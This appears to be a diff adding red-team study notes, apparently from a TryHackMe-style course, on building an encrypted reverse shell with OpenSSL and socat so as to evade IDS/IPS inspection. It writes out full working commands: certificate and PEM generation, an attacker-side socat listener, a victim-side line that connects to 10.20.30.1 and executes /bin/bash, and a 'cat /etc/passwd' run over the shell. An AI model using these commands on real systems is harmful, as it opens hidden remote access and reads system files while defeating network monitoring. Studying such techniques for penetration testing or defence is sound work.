@@ -1,0 +1,51 @@
+OpenSSL - toolkit for general-purpose cryptography and secure communication
+Source: https://www.openssl.org/
+
+Encrypt the Communication Channel:
+  openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
+                              Encrypt the Communication Channel: Create the key using OpenSSL. The above command returns: 
+                                Private key: thm-reverse.key 
+                                Certificate: thm-reverse.crt
+  cat thm-reverse.key thm-reverse.crt > thm-reverse.pem
+                              Use `cat` to Create our PEM file from the two files that we have just created
+                              The Privacy Enhanced Mail (PEM) `.pem` file requires the concatenation of the 
+                              private key `.key` and the certificate `.crt` files
+  socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT`
+                              Secondly, with the PEM file ready, we can start listening while using the key
+                              for encrypting the communication with the client
+  socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash
+                              Thirdly, on the victim system. Note that the `EXEC` invokes the specified program.
+  cat /etc/passwd             Back to the attacker system
+                              However, if the IDS/IPS inspects the traffic, all the packet data will be encrypted.
+
+OpenSSL Options:
+  req      Indicates that this is a certificate signing request. Obviously, we won’t submit our certificate for signing
+  -x509    Specifies that we want an X.509 certificate
+  -newkey rsa:4096 
+           Creates a new certificate request and a new private key using RSA, with the key size being 4096 bits
+           (You can use other options for RSA key size, such as -newkey rsa:2048)
+  -days 365   Shows that the validity of our certificate will be one year
+  -subj    Sets data, such as organization and country, via the command-line
+  -nodes   Simplifies our command and does not encrypt the private key
+  -keyout PRIVATE_KEY 
+           Specifies the filename where we want to save our private key
+  -out CERTIFICATE
+           Specifies the filename to which we want to write the certificate request
+
+Socat Options:
+  -d -d    Provides some debugging data (fatal, error, warning, and notice messages)
+  OPENSSL-LISTEN:PORT_NUM 
+           Indicates that the connection will be encrypted using OPENSSL
+  cert=PEM_FILE 
+           Provides the PEM file (certificate and private key) to establish the encrypted connection
+  verify=0 
+           Disables checking peer’s certificate
+  fork     Creates a sub-process to handle each new connection
+
+Network Security Evasion via Payload Manipulation:
+Because an IDS/IPS won’t inspect encrypted data, an attacker can take advantage of encryption to evade detection. Unlike encoding, encryption requires an encryption key.
+One direct approach is to create the necessary encryption key on the attacker’s system and set socat to use the
+encryption key to enforce encryption as it listens for incoming connections. An encrypted reverse shell can be carried out in three steps:
+  1. Create the key
+  2. Listen on the attacker’s machine
+  3. Connect to the attacker’s machine
